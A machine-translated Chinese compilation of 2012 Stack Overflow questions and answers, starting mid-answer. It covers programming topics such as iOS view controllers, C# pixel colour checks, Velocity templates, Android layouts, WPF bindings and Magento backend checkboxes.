不确定您问题的第一部分（即阅读内容），但 Apple 的 VC 类模板表明它们有自己的`initWithNibName:bundle`方法，该方法使用与给定参数相同的参数调用 super。因此，根据您的情况，我会说这正是指定的初始化程序，并且`init`在 super 上调用简单方法并不“安全”，因为它将调用`initWithNibName:bundle`. 我相信 UIViewController 的 init 看起来像这样：

```
- (id)init
{
  self = [self initWithNibName:nibNameDerivedFromClass bundle:probablyNilOrMainBundle];

  if (!self) return nil;

  // some extra initialization

  return self;
} 
```

由于超类没有`initWithNibName:bundle`它必须调用自己的方法，使其成为指定的初始化程序。由于您已经覆盖了它，ObjC 的运行时将`self`在该方法中替换为您的类。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-04T14:19:09.770

如果您想从创建 UIViewController 的 GUI 中排除 Interface Builder，您必须自己覆盖`loadView`并创建视图。不要实施`initWithNibName:bundle:`.

```
- (void)loadView {
    // Init a view. The frame will be automatically set by the view controller.
    UIView *view = [[UIView alloc] initWithFrame:CGRectZero];

    // Add additional views (buttons, sliders etc.) to your view here.

    // Set the view controller's view to the new view.
    self.view = view.
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T14:19:28.590

> 首先，我应该在文档中的哪个位置阅读，以便我期望对父 init 类的调用调用我自己的 initWithNibName:bundle: 方法？

你不知道，这是一个设计问题。`init`不是所有类的基本初始化方法

> 其次，这对苹果来说是一个好的设计选择。我不明白为什么这是可取的行为？（可能是我在这里没有了解全局，所以请随时提示我。）

当`init`调用它时，它会发送 nil 名称和包，并且默认为一个空的 xib 文件。总有一个 xib 文件，不管你的与否。

> 第三，我如何最好地绕过它。我只是从我的代码中取出 initWithNibName:bundle: 吗？从来没有这样的情况，我想选择使用 xib 或手动实例化类。

你没有。如果您只是调用超级，您实际上并不需要那里有该代码，而只是转发一个方法。

* * *

## 回答 #4

> 赞同：-3
> 
> 时间：2012-12-04T15:58:18.960

您可以自定义视图并在 viewDidLoad 方法中添加子视图。在此方法中，您可以通过检查属性 nibName 来检查该类是使用 init 还是使用 initWithNibName:bundle: 创建的。使用 init 时，nibName 将为 nil。

```
- (void)viewDidLoad
{
    [super viewDidLoad];
    if (!self.nibName) {
        // View was not loaded from nib - setup view
    }
} 
```

# c# - 如何确定图像是否包含特定颜色？

> ID：13704867
> 
> 赞同：1
> 
> 时间：2012-12-04T14:13:26.967
> 
> 标签：c#, .net, system.drawing

我需要确定图像是否包含特定颜色：

```
r:255
g:0
b:192 
```

我找到了这个，但是如果图像包含上述颜色，我需要返回一个布尔值，而不是返回点。

```
public static List<Point> FindAllPixelLocations(this Bitmap img, Color color)
        {
            var points = new List<Point>();

            int c = color.ToArgb();

            for (int x = 0; x < img.Width; x++)
            {
                for (int y = 0; y < img.Height; y++)
                {
                    if (c.Equals(img.GetPixel(x, y).ToArgb())) points.Add(new Point(x, y));
                }
            }

            return points;
        } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T14:15:39.213

听起来你只需要更换

```
if (c.Equals(img.GetPixel(x, y).ToArgb())) points.Add(new Point(x, y)); 
```

经过

```
if (c.Equals(img.GetPixel(x, y).ToArgb())) return true; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T14:19:11.420

像这样的东西：

```
 public static bool HasColor(this Bitmap img, Color color)
    {
        for (int x = 0; x < img.Width; x++)
        {
            for (int y = 0; y < img.Height; y++)
            {
                if (img.GetPixel(x, y) == color)
                    return true;
            }
        }
        return false;
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T14:36:08.940

这两个答案都是正确的，但你必须知道， `GetPixel(x, y)`颜色`SetPixel(x, y)`很慢，对于高分辨率的图像来说是不好的。

为此，您可以`LockBitmap`在此处使用类：[Work with bitmaps faster](http://www.codeproject.com/Tips/240428/Work-with-bitmap-faster-with-Csharp)

这大约快 5 倍。

# eclipse-plugin - 检查eclipse插件开发中是否点击了保存按钮

> ID：13704868
> 
> 赞同：0
> 
> 时间：2012-12-04T14:13:28.293
> 
> 标签：eclipse-plugin

我正在尝试添加装饰器（例如，向文件添加后缀）每当在当前打开的文件中单击保存按钮时，我都会搜索但很难弄清楚这是我的代码

```
public void decorate(Object resource, IDecoration decoration) {

    if () //I'm having trouble with this check
    {
    decoration.addSuffix("--Modified");
    }
    } 
```

帮助将不胜感激

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-06T05:11:32.290

如果编辑器“脏”意味着未保存或不脏意味着已保存，则有一个 IEditorPartListener 进行侦听，您需要获取对 IEditorPart 的引用并添加正确的侦听器，而不是您可以随意装饰导航器。

# jsp - 如何将获取请求参数传递给我的 Velocity 模板以发送邮件

> ID：13704870
> 
> 赞同：3
> 
> 时间：2012-12-04T14:13:34.690
> 
> 标签：jsp, servlets, velocity

我有一个 JSP，在那个 JSP 中我有一个看起来像的链接

[http://mydomain.com/verify.do?email=emailid&id=123](http://mydomain.com/verify.do?email=emailid&id=123)

现在，当用户单击该链接时，它会转到我的velocityview servlet，现在我的问题是如何在velocity servlet 中提取这些参数并将其放入上下文中，以便将其发送到我的模板。

我尝试了 getparameter、#set(#request.getAttribute(email) 等。但由于某种原因，我没有看到值进入上下文或模板。

我知道那里有速度参数工具，但我无法找到如何安装和使用它。如果有人能指出正确的方向，我将不胜感激。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-04T14:34:03.953

解决方案是[Velocity 上下文](http://velocity.apache.org/engine/releases/velocity-1.7/developer-guide.html#The_Context)。在您的支持 Java 类或 Velocity servlet 中，读入参数并将它们放在上下文中：

```
context.put("email", request.getParameter("email"));
context.put("id", request.getParameter("id")); 
```

然后在您的 Velocity 模板中，您可以将它们引用为`$email`和`$id`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-21T21:23:37.530

在接受的答案中，您必须明确展开控制器中的所有参数。因此，如果您有 5 个字段，那么您就有 5 个上述语句。

我会建议：

```
context.put("request", request); 
```

然后在你的模板中是这样的：

```
<p>Is the Jump Run Heading Good? <b>$request.getParameter("heading")</b></p> 
```

也许你可以写一个小宏来避免最后一点丑陋。您编写了一个小辅助函数来使用 getParameterNames() 遍历请求参数名称并在每个上调用 getParameter()。

# javascript - jQuery Mobile 字段容器无法正确呈现

> ID：13704871
> 
> 赞同：0
> 
> 时间：2012-12-04T14:13:37.173
> 
> 标签：javascript, jquery, html, jquery-mobile

我想使用 jQuery Mobile 的 Field 容器，但[结果](http://jsfiddle.net/UNL9A/3/)看起来不像[文档](http://jquerymobile.com/demos/1.2.0/docs/forms/textinputs/index.html)。

这是我的代码：

```
<div data-role="page">
    <div data-role="content">
        <form>        
            <div data-role="fieldcontain">
                <label for="name">Text Input:</label>
                <input type="text" name="name" id="voila" value=""  />
            </div>
        </form>
    </div>
</div>​ 
```

如果我将字段 id 重命名为“名称”或“通过”，它看起来还可以：http: [//jsfiddle.net/UNL9A/2](http://jsfiddle.net/UNL9A/2)

这怎么可能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:21:04.740

标签的`for`属性应与`id`文本输入的属性相匹配。这应该看起来不错：

```
<div data-role="page">
    <div data-role="content">
    <form>        
        <div data-role="fieldcontain">
            <label for="voila">Text Input:</label>
            <input type="text" name="name" id="voila" value=""  />
        </div>
    </form>
    </div>
</div>​ 
```

# android - Android TableRow 布局中的垂直线

> ID：13704874
> 
> 赞同：0
> 
> 时间：2012-12-04T14:13:43.553
> 
> 标签：android, android-layout

我想在 Android 布局`TextView`之间添加分隔线。`EditText`我已经尝试过[这种](https://stackoverflow.com/a/10282253/840566)方法来做到这一点但是当我使用它时

```
 <TableRow
                android:id="@+id/frmPaymentTrRemainder"
                style="@style/rounded_row" >
                <TextView
                    android:id="@+id/frmPaymentTvRemainder"
                    style="@style/rounded_label"
                    android:text="Field" />
                <EditText
                    android:id="@+id/frmPaymentEtRemainder"
                    style="@style/rounded_value"
                    android:editable="false"
                    android:ems="10"
                    android:inputType="numberDecimal" />
                <View
                    android:layout_width="2dip"
                    android:layout_height="fill_parent"
                    android:layout_margin="6dp"
                    android:layout_weight="0.1"
                    android:background="#FF909090" />
            </TableRow> 
```

![截图1](../Images/f86d9eecf1982338569c54064269ba1b.png)

当我在文本视图之间放置视图时

```
 <TableRow
                android:id="@+id/frmPaymentTrRemainder"
                style="@style/rounded_row" >

                <TextView
                    android:id="@+id/frmPaymentTvRemainder"
                    style="@style/rounded_label"
                    android:text="Field" />

                <View
                    android:layout_width="2dip"
                    android:layout_height="fill_parent"
                    android:layout_margin="6dp"
                    android:layout_weight="0.1"
                    android:background="#FF909090" />

                <EditText
                    android:id="@+id/frmPaymentEtRemainder"
                    style="@style/rounded_value"
                    android:editable="false"
                    android:ems="10"
                    android:inputType="numberDecimal" />
            </TableRow> 
```

![截图2](../Images/9cfed02d9d0ee93047dd2743e18545c1.png)

我只想要 TextView 和 EditText 之间的 2pix 分隔符。任何有助于实现这一挑战的帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:22:05.103

尝试在 EditText 之后移动分隔视图，或将 EditText 和 View 包装在 LinearLayout 中，并将权重设置为 1 和 0。

```
<LinearLayout
            android:layout_width="match_parent"
            android:layout_height="match_parent"
        >
       <View
                android:layout_width="2dip"
                android:layout_height="fill_parent"
                android:layout_margin="6dp"
                android:layout_weight="0"
                android:background="#FF909090" />

    <EditText
            android:id="@+id/frmPaymentEtRemainder"
            style="@style/rounded_value"
            android:editable="false"
            android:ems="10"
            android:layout_weight="1"
            android:inputType="numberDecimal" />

    </LinearLayout> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T14:17:24.067

尝试删除 weight 属性

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T14:20:31.143

尝试这个 ：

`<ImageView android:layout_width="2dip" android:layout_height="fill_parent" android:background="#FF909090" />`

# javascript - 如何检查我在文本框中的值是否已更改？

> ID：13704876
> 
> 赞同：0
> 
> 时间：2012-12-04T14:13:47.637
> 
> 标签：javascript, asp.net, html

> **可能重复：**
> [值更改时的javascript文本框调用事件](https://stackoverflow.com/questions/2829491/javascript-textbox-call-event-when-value-changes)

如何检查我在文本框中的值是否已更改？不使用按钮...（在 javascript 中自动更新！）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T14:21:37.690

利用：

```
<input type="text" id="myInput" onchange="alert('changed')" /> 
```

# scala - Scala 编译器生成抛出代码

> ID：13704877
> 
> 赞同：1
> 
> 时间：2012-12-04T14:13:48.720
> 
> 标签：scala, compiler-construction, scala-compiler

我正在尝试更改其他人编写的编译器插件，该插件直接在打字机之后运行，我想生成引发异常的代码。

异常类如下所示：

```
case class MyException(message: String) extends Exception(message) 
```

不过，在实际代码中，这是一个内部类。

我查看了他如何获得固定类的符号并以类似的方式进行操作，我不知道是否有更好的方法，但这是他的操作方式：

```
val exceptionClass = MyException.getClass.getName
val exceptionName = if (exceptionClass.last == '$') exceptionClass.dropRight(1) else exceptionClass
val symbol = rootMirror.getModuleByName(newTermName(exceptionName)) 
```

为了抛出异常，我这样做了：

```
import CODE._
THROW(symbol, Literal(Constant("My message"))) 
```

我认为，以下也是等效的（并且产生等效的行为）

```
Throw(symbol.tpe, Literal(Constant("My Message")))
Throw(NEW(symbol, Literal(Constant("My message"))))
Throw(New(symbol.tpe, Literal(Constant("My message")))) 
```

但我有一个例外：

```
== Enclosing template or block ==

Apply( // val <error>: <error> in class <error>
  new MyException.type."<init>" // val <error>: <error> in class <error>, tree.tpe=<error>
  Nil
)

== Expanded type of tree ==

TypeRef(TypeSymbol(class MyException extends ))

uncaught exception during compilation: scala.reflect.internal.Types$TypeError
error: scala.reflect.internal.Types$TypeError: MyException.type does not have a constructor
... 
```

我想我不得不以不同的方式使用“新”，有人知道这是如何正确完成的吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T18:44:25.273

Scala 邮件列表中的某个人告诉了我解决方案：

我应该以不同的方式获取符号，我需要类的符号，而不是模块的符号，如果它是一个对象来调用它的方法等，则使用后者，但我们需要这里的类，所以而不是

```
val symbol = rootMirror.getModuleByName(newTermName(exceptionName)) 
```

我写的

```
val symbol = rootMirror.getClassByName(newTermName(exceptionName)) 
```

# ruby-on-rails - 在数据库中创建具有嵌套属性的记录

> ID：13704884
> 
> 赞同：0
> 
> 时间：2012-12-04T14:14:16.170
> 
> 标签：ruby-on-rails

我有以下2个模型。

```
class Expression < ActiveRecord::Base

has_many :patterns, :foreign_key => "PTN_EXPRESSION_FK", :dependent => :destroy
accepts_nested_attributes_for :patterns, :allow_destroy => true

end

class Pattern < ActiveRecord::Base

belongs_to :expression, :foreign_key => :PTN_EXPRESSION_FK

end 
```

我想创建一条记录（具有嵌套属性）并将其存储在表中而不使用表单。

```
Expression.create(:EXP_VALUE  =>  @exp.val,
          :EXP_ADD_VALUE =>  @exp.add_val    
          ) 
```

上面的代码创建一个表达式记录并将其保存在表达式表中。

我还想将模式值传递给上面的代码，以便在存储表达式的同时将模式值存储在模式表中。

如何在上面的“创建”代码中传递嵌套属性值？

非常感谢您的建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T14:27:34.980

嵌套属性可能是这样的：

```
Expression.create(:EXP_VALUE  =>  @exp.val,
      :EXP_ADD_VALUE =>  @exp.add_val,
      :patterns_attributes => [
        '0' => {:pattern_attr1 => ..., pattern_attr2 => ..., ...},
        '1' => {:pattern_attr1 => ..., pattern_attr2 => ..., ...},
        '2' => {:pattern_attr1 => ..., pattern_attr2 => ..., ...},
        ...
       ]
    ) 
```

# php - jquery-datatables-editable sName 不工作

> ID：13704894
> 
> 赞同：0
> 
> 时间：2012-12-04T14:14:45.767
> 
> 标签：php, javascript, jquery, datatables

我正在使用[jquery-datatables-editable](https://code.google.com/p/jquery-datatables-editable/)并尝试设置在更新时发布的值。
根据文档，这可以通过设置[sName](http://www.datatables.net/docs/DataTables/1.9.beta.2/DataTable.defaults.columns.html#sName)属性（属于[aoColumns](http://www.datatables.net/docs/DataTables/1.9.beta.2/DataTable.defaults.columns.html)）来完成。
我尝试按照示例进行操作，都在 aoColumns 和 aoColumnDefs 中定义，但都没有成功。

有任何想法吗？
代码示例；

鉴于：

```
<?php
<div>
    <button id="p_btnAddNewRow">Add</button>
    <button id="p_btnDeleteRow">Delete</button>

    <div id="p-container">
        <table cellpadding="0" cellspacing="0" border="0" class="display" id="p-table">
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Name</th>
                    <th>Notes</th>
                </tr>
            </thead>
            <tbody>
                <?php
                if (isset($p['primary']) && is_array($p['primary']) && (count($p['primary']) > 0)) {
                    foreach ($p['primary'] as $primary) {
                ?>
                <tr id="<?php echo $primary->id; ?>">
                    <td><?php echo $primary->code; ?></td>
                    <td><?php echo $primary->name; ?></td>
                    <td><?php echo $primary->notes; ?></td>
                </tr>
                <?php
                    }
                }
                ?>
            </tbody>
        </table>
    </div>
</div>
?> 
```

JS；

```
<script type="text/javascript">

var pTable;
$(function() {
    pTable = $('#primary-audiences-table').dataTable().makeEditable({
        sAddNewRowFormId: "p_formAddNewRow",
        sAddNewRowButtonId: "p_btnAddNewRow",
        sAddURL: "/templates/ptable/add",
        fnOnNewRowPosted: function(data) {
                            if(data.indexOf("Error", 0) == 0) {
                                //Show error message
                                return false;
                            } else {
                                //Show success message and add row
                                return true;
                            }
                        },
        sUpdateURL: "/templates/ptable/edit",
        sDeleteRowButtonId: "p_btnDeleteRow",
        sDeleteURL: "/templates/ptable/delete",
        "aoColumns": [
                        {
                            sName: 'code',
                            indicator: 'Saving ID...',
                            tooltip: 'Double Click to edit',
                            type: 'textarea',
                            submit: 'Save changes'
                        },
                        {
                            sName: 'name',
                            indicator: 'Saving name...',
                            tooltip: 'Double Click to edit',
                            type: 'textarea',
                            submit: 'Save changes'
                        },
                        {
                            sName: 'notes',
                            indicator: 'Saving notes...',
                            tooltip: 'Double Click to edit',
                            type: 'textarea',
                            submit: 'Save changes'
                        }
                ]
    });
}); 
```

示例响应（$_POST 的 print_r）：

```
(
    [value] => test
    [id] => 2784
    [rowId] => 0
    [columnPosition] => 0
    [columnId] => 0
    [columnName] => ID <- should be **code**
) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-05T08:52:57.323

我找到了答案：给程序员多喝咖啡（就是我）并正确阅读文档！！

**sName**属性关联到*dataTables*扩展，而**不是**makeEditable*扩展*。文档中的示例确实显示了这一点，但我未能正确阅读；我的错。

因此，正确的写法是；

```
<script type="text/javascript">

var pTable;
$(function() {
    pTable = $('#primary-audiences-table').dataTable({
        aoColumns: [ {"sName": "code"}, {"sName": "name"}, {"sName": "notes"} ]
    }).makeEditable({
        sAddNewRowFormId: "p_formAddNewRow",
        sAddNewRowButtonId: "p_btnAddNewRow",
        sAddURL: "/templates/ptable/add",
        fnOnNewRowPosted: function(data) {
                            if(data.indexOf("Error", 0) == 0) {
                                //Show error message
                                return false;
                            } else {
                                //Show success message and add row
                                return true;
                            }
                        },
        sUpdateURL: "/templates/ptable/edit",
        sDeleteRowButtonId: "p_btnDeleteRow",
        sDeleteURL: "/templates/ptable/delete",
        "aoColumns": [
                        {
                            indicator: 'Saving ID...',
                            tooltip: 'Double Click to edit',
                            type: 'textarea',
                            submit: 'Save changes'
                        },
                        {
                            indicator: 'Saving name...',
                            tooltip: 'Double Click to edit',
                            type: 'textarea',
                            submit: 'Save changes'
                        },
                        {
                            indicator: 'Saving notes...',
                            tooltip: 'Double Click to edit',
                            type: 'textarea',
                            submit: 'Save changes'
                        }
                ]
    });
});

</script> 
```

# c# - 如何从 MVVM 中的 ViewModel 访问用户控件（工具栏）？

> ID：13704898
> 
> 赞同：1
> 
> 时间：2012-12-04T14:14:50.307
> 
> 标签：c#, .net, wpf, mvvm

如何在按钮上使用工具栏（它是一个用户控件）来启用等待光标。我有一个 ViewModel 是从 viewmodelBase 继承的。但我不能在工具栏上使用 IsWorking。

下面的代码是工具栏的代码。我点击了选择按钮。数据正在从数据库中选择。光标必须转动等待。选择后，光标必须返回正常。

```
 <Button x:Name="Select"
            Content="select"
            Command="{Binding SelectCommand }">
        <Button.Style>
             <Style TargetType="{x:Type Button}">
                 <Setter Property="Cursor" Value="Arrow"/>
                 <Style.Triggers>
                     <DataTrigger Binding="{Binding Path=IsWorking}" Value="True">
                         <Setter Property="Cursor" Value="Wait"/>
                     </DataTrigger>
                 </Style.Triggers>
             </Style>
        </Button.Style>
    </Button> 
```

**ViewModelBase.cs：** 工具栏没有继承。它是一个基本模型。

```
private bool _isWorking = false;
public bool IsWorking
{
    get { return _isWorking; }
    set
    {
        _isWorking = value;
        OnPropertyChanged("IsWorking");
    }
} 
```

这是视图模型中的代码：

```
public class MainViewModel : ViewModelBase
{
    public void Select()
    {
        IsWorking = true;     cursor turn to wait mode
        // db Process...

        IsWorking = false;  cursor turn to hand mode
    }
} 
```

如何从 ViewModel 与工具栏通信？单击选择光标必须打开等待模式。选择后，光标必须是手形（默认）。

[在 WPF 中更改光标有时有效，有时无效](https://stackoverflow.com/questions/307004/changing-the-cursor-in-wpf-sometimes-works-sometimes-doesnt)

![在此处输入图像描述](../Images/4b79453dee53fe913c8b6dfbd19e90ed.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T14:34:37.170

据我所知，您的问题是您试图从 UserControl 绑定回它所在的视图/窗口。

用户控件当然不能像这样绑定。你有几个选择：

1\. **给 UserControl 视图的数据上下文：**

```
<local:UserControl1 DataContext="{Binding ElementName=MyWindow}" /> 
```

然后在您的 UserControl 中，您可以`IsWorking`直接绑定到 ViewModel：

```
<DataTrigger Binding="{Binding IsWorking}" Value="True">
  <Setter Property="Cursor" Value="Wait"/>
</DataTrigger> 
```

2. **在您的用户控件上创建一个依赖属性并从视图绑定到它：**
在您的用户控件中创建一个新的 DP：

```
public bool MyIsWorking
{
  get { return (bool)GetValue(MyIsWorkingProperty ); }
  set { SetValue(MyIsWorkingProperty , value); }
}

public static readonly DependencyProperty MyIsWorkingProperty =
        DependencyProperty.Register("MyIsWorking", typeof(bool), typeof(UserControl1),    new UIPropertyMetadata(false)); 
```

在 usercontrol 的 XAML 中绑定到 DP：

```
<DataTrigger Binding="{Binding MyIsWorking}" Value="True">
        <Setter Property="Cursor" Value="Wait"/>
</DataTrigger> 
```

在您的窗口中 - 将 DP 绑定到 VM 的`IsWorking`属性：

```
<local:UserControl1 MyIsWorking="{Binding IsWorking, ElementName=MyWindow}" /> 
```

3\. 最后**这** ***会*** **起作用，但不建议这样做！！！****

```
<DataTrigger Binding="{Binding IsWorking, RelativeSource={RelativeSource FindAncestor, AncestorType=Window}}" Value="True">
    <Setter Property="Cursor" Value="Wait"/>
</DataTrigger> 
```

它的作用是尝试在可视树中找到窗口并使用它的 DataContext。为什么不推荐？因为您可能没有在 Window 中使用它，或者您可能不希望它绑定到包含 Window 正在使用的特定 DataContext。不管怎样，这是另一种可能。

# java - Java - 以编程方式从给定的 WSDL 创建 SOAP

> ID：13704905
> 
> 赞同：1
> 
> 时间：2012-12-04T14:15:12.207
> 
> 标签：java, soap, wsdl

大多数 Web 服务都提供 WSDL 链接。当您将此 WSDL 链接传递给 Eclipse 时，它​​会生成 JAVA 编码的客户端。当您将 WSDL 链接传递给 SOAPUI 时，它会生成 SOAP 信封。

问题是：

java中是否有允许我以编程方式生成SOAP XML的API？

像这样的东西：

```
WSDLReader re = new WSDLReader("WSDLURL");
String s = re.getWSDL(); 
```

**附加信息：** 我发现了一个执行类似操作的 API，它称为 SOAP-WS。但是文档中给出的示例是基于 Maven 的。我想要它在普通的 JAVA 中，即非 Maven 基础。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-09T07:23:28.370

我已经通过以下链接解决了这个问题：
[http](http://www.membrane-soa.org/create-soap-request.htm)
://www.membrane-soa.org/create-soap-request.htm 这是我问题的答案。只需下载所需的 JAR，将它们包含在您的项目中并使用随附的示例。之后，如果您传递一个 WSDL 文件，程序将生成所需的 SOAP 请求。这适用于碰巧遇到与我相同问题的任何人。:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T14:27:47.943

我反对用编码来搞乱哲学，但是。

您应该知道 WSDL 将 XML 用于自己的目的。因此，根据这个事实，您可以从给定的网址下载 XML 文件。然后 XML 文件与任何其他文本文件没有区别。所以在这个事实上，我们可以说下载和阅读文本文件减少了问题。

为了允许您可以使用[Java NIO](http://en.wikipedia.org/wiki/New_I/O)，（[示例](https://stackoverflow.com/questions/921262/how-to-download-and-save-a-file-from-internet-using-java)）下载文件。

# linux - 限制 USB 小工具驱动程序速度

> ID：13704906
> 
> 赞同：0
> 
> 时间：2012-12-04T14:15:12.960
> 
> 标签：linux, kernel, usb, composite

tl;dr：如何强制 Linux 拒绝高速 USB 连接，使其默认为全速？

完整解释：

我正在编写基于 Linux 小工具零的 USB 小工具驱动程序。我正在测试的硬件具有高速 USB，而实际产品并非如此。出于某种原因，小工具（尽管它在任何配置上都没有高速描述符）被报告为高速小工具（`struct usb_gadget->speed==USB_SPEED_HIGH`在复合小工具的 set_config 函数上）。这使得驱动程序在配置绑定之前惨遭失败（尝试加载显然不存在的高速配置）。

我正在寻找一种方法来通知 Linux 该小工具不具备高速能力，因此当主机连接时，从全速到高速的切换被拒绝（或会产生类似结果的东西）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:35:35.023

`uhci`和`ohci`内核模块驱动 USB 1.X 控制器。 `ehci`模块驱动 USB 2.0 控制器。

如果您卸载其中一个，您将对另一个实施限制。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2017-07-11T15:59:36.710

```
enum usb_device_speed       speed;
enum usb_device_speed       max_speed;

you can setup usb_composite_driver 
```

# c# - 文本框中的换行符

> ID：13704909
> 
> 赞同：4
> 
> 时间：2012-12-04T14:15:37.007
> 
> 标签：c#, silverlight

我有一个带有多个文本框的 Silverlight 应用程序。它们具有静态宽度并`TextWrapping`设置为`TextWrapping.Wrap`.

一切都很好，但有时当用户键入文本时，文本框不会重新调整大小。看起来他认为它适合一行，但光标转到换行符，当我再输入一个字母时，文本框会重新调整大小。

![在此处输入图像描述](../Images/af49238d3141ad5670f1203f7a28ddcb.png)

![在此处输入图像描述](../Images/e1927c106bebb5f8deabdabf069139bb.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-25T16:44:18.963

它可能与 ScrollBar 可见性有关。如果您更改任何内容，TextBox 样式中的 ScrollBar 样式可能需要修复？

# forms - Magento，在网格和表单后端添加并设置一个复选框

> ID：13704911
> 
> 赞同：3
> 
> 时间：2012-12-04T14:15:45.703
> 
> 标签：forms, magento, checkbox, magento-1.7, backend

我有一个完整的后端页面，带有一个网格和一个相应的表单来编辑相应模型上的更改。我在表上添加了一个新字段，位类型，因为它将回答用户的是/否配置选项。我在网格和表单上都添加了复选框。

我的问题是，经过几个小时的搜索和尝试不同的方法后，我无法`checked`在网格和从数据库中读取相应字段的表单上设置复选框值。此外，当我单击表单上的保存时，与复选框对应的值始终保存为**1**。网格上的所有其他内容和表单都可以正常工作。我已阅读[此处](https://stackoverflow.com/questions/5814906/how-to-set-value-of-checkbox-in-magento-custom-module)、[此处](http://www.magentocommerce.com/boards/viewthread/20536/)、[此处](http://www.atwix.com/magento/using-checkboxes-in-magento-backend/)、[此处](http://www.excellencemagentoblog.com/magento-admin-form-field)以及更多网站和[SO 问题/答案](https://stackoverflow.com/search?q=%5Bmagento%5D%20checkbox&submit=search)，但仍然不知道我做错了什么。一些解决方案建议使用带有`YES/NO`选项的组合框，但我想要一个复选框，不会那么难。

函数内的网格代码`_prepareColumns()`：

```
protected function _prepareColumns() {
    ...
    $this->addColumn('banner_gral', array(
        'header'    => Mage::helper('banners')->__('General'),
        'align'     => 'center',
        'index'     => 'banner_gral',
        'type'      => 'checkbox',
        'values'    => $this->getBannerGral()==1 ? 'true' : 'false',
     ));
    ...
}

public function __construct()
{
    parent::__construct();
    $this->setId('bannersgrid');
    $this->setDefaultSort('bannerid');
    $this->setDefaultDir('asc');
    $this->setSaveParametersInSession(true);
    $this->setUseAjax(true);
}

public function getGridUrl()
{
    return $this->getUrl('*/*/grid', array('_current'=>true));
}

protected function _prepareCollection()
{
    $collection = Mage::getModel('banners/bannersadmin')->getCollection();
    $this->setCollection($collection);
    return parent::_prepareCollection();
} 
```

在函数内添加复选框的表单代码`_prepareForm()`：

```
protected function _prepareForm()
{
    $id = $this->getRequest()->getParam('id');
    $params = array('id' => $this->getRequest()->getParam('id'));

    if (Mage::registry('banners_data')->getdata())  {
        $data = Mage::registry('banners_data')->getdata();
    }
    elseif (Mage::getSingleton('adminhtml/session')) {
        $data = Mage::getSingleton('adminhtml/session')->getdata();
        Mage::getSingleton('adminhtml/session')->getdata(null);
    }
    else {
        $data = array();
    }

    $form = new Varien_Data_Form(array(
                                    'id' => 'edit_form',
                                    'action' => $this->getUrl('*/*/save', $params),
                                    'method' => 'post',
                                    'enctype' => 'multipart/form-data',
    ));
    ...

    $fieldset->addField('banner_gral', 'checkbox', array(
        'label'    => Mage::helper('banners')->__('Is general'),
        'name'     => 'banner_gral',
        'class'    => 'banner_gral',
        'checked'  => $this->getBannerGral()==1 ? 'true' : 'false',
        'onclick'  => 'this.value == this.checked ? 1 : 0',
        'note'     => Mage::helper('banners')->__('blablablabla'),
        'tabindex'  => 2
    ));
    ...
} 
```

在`saveAction()`我的表格中，我有：

```
$campaign->setbanner_gral(!empty($data['banner_gral'])); 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-12-04T15:23:48.420

在您的控制器 saveAction() 保存复选框数据时

```
$banner_gral = isset($your_form_Data['banner_gral']) ? 1 : 0; 
```

**对于网格和表单页面**

在您的控制器中，您应该有 Mage::register(...)->getData() 或 Mage::register(...)

```
public function editAction()
     ....
     Mage::register('example_data', $model); 
```

在您的表格上 _prepareForm()

```
$model = Mage::registry('example_data'); // NOTE registry('example_data'); NOT registry('example_data')->getData();

$fieldset->addField('entire_range', 'checkbox', array(
      ....
      'checked'    => $model->getBannerGral()==1 ? 'true' : 'false',
       ......
)) 
```

见[http://www.magentocommerce.com/boards/viewthread/20536/](http://www.magentocommerce.com/boards/viewthread/20536/)

在你的网格 _prepareColumns()

```
$this->addColumn('banner_gral', array(
    ....
    'type'     => 'checkbox',
    'index'    => 'banner_gral',
    'values'   => array(1,2),
    'field_name' => 'checkbox_name',
    ....
)); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-05T10:51:12.733

@RS 回答了一个问题，如何将复选框值保存在相应的模型/数据库字段中。但是关于如何在网格和表单上正确显示复选框的问题并没有解决。在进行了更多搜索之后，我终于找到了这两个帮助我解决问题的链接。

纠正网格问题：[了解网格序列化程序块](http://magebase.com/magento-tutorials/understanding-the-grid-serializer-block/)

现在添加复选框列的代码部分，请参阅我`array(1,2)`在`values`元素上添加的部分。

```
$this->addColumn('banner_gral', array(
        'header'   => Mage::helper('banners')->__('General'),
        'width'    => '20px',
        'type'     => 'checkbox',
        'align'    => 'center',
        'index'    => 'banner_gral',
        'values'   => array(1,2),
        'editable' => 'false',
)); 
```

此外，如果您查看 Magento 的核心代码，该类会`Mage_Adminhtml_Block_Widget_Grid_Column_Renderer_Checkbox`返回一个值数组。看看这里终于让我走上了正确的道路。

```
/**
 * Returns values of the column
 *
 * @return array
 */
public function getValues()
{
    if (is_null($this->_values)) {
        $this->_values = $this->getColumn()->getData('values') ? $this->getColumn()->getData('values') : array();
    }
    return $this->_values;
} 
```

要更正表单问题：[Mage_Adminhtml_Block_System_Store_Edit_Form 类参考](http://freegento.com/doc/d0/d31/class_mage___adminhtml___block___system___store___edit___form.html)

